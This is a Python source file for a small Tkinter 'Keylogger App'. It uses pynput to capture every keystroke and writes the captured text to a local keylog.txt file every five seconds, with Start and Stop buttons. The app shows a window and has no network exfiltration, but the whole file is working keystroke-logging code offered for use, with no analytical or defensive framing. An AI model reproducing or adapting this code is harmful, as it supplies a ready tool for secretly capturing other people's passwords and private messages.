import tkinter as tk
from tkinter import messagebox
import threading
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.timer = None  # To manage the reporting timer

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            self.append_to_log(str(key.char))
        except AttributeError:
            if key == key.space:
                self.append_to_log(" ")
            else:
                self.append_to_log(f"[{str(key)}]")

    def report(self):
        with open("keylog.txt", "a") as file:
            file.write(self.log + "\n")
        self.log = ""
        # Start the timer again if it hasn't been stopped
        self.timer = threading.Timer(5, self.report)
        self.timer.start()

    def start(self):
        # Start the listener and timer for key logging
        self.listener = keyboard.Listener(on_press=self.process_key_press)
        self.listener.start()
        self.report()

    def stop(self):
        # Stop the listener and cancel the timer
        if self.listener:
            self.listener.stop()  # Properly stop the listener
            self.listener = None
        if self.timer:
            self.timer.cancel()  # Properly cancel the timer
            self.timer = None  # Ensure the timer reference is cleared

def start_keylogger():
    global keylogger
    keylogger = Keylogger()
    threading.Thread(target=keylogger.start, daemon=True).start()
    messagebox.showinfo("Action", "Keylogger has started!")

def stop_keylogger():
    global keylogger
    if keylogger:
        keylogger.stop()  # Call the stop method to terminate listener and timer
        messagebox.showinfo("Action", "Keylogger has stopped!")
    else:
        messagebox.showwarning("Warning", "Keylogger is not running!")

# Create the GUI
app = tk.Tk()
app.title("Keylogger App")
app.geometry("300x200")
app.configure(bg="#f0f0f0")

header_label = tk.Label(app, text="Keylogger App", font=("Arial", 16, "bold"), bg="#f0f0f0")
header_label.pack(pady=10)

start_button = tk.Button(app, text="Start Keylogger", command=start_keylogger, bg="#4caf50", fg="white", font=("Arial", 12, "bold"))
start_button.pack(pady=10)

stop_button = tk.Button(app, text="Stop Keylogger", command=stop_keylogger, bg="#f44336", fg="white", font=("Arial", 12, "bold"))
stop_button.pack(pady=10)

exit_button = tk.Button(app, text="Exit", command=app.quit, bg="#555555", fg="white", font=("Arial", 12, "bold"))
exit_button.pack(pady=10)

app.mainloop()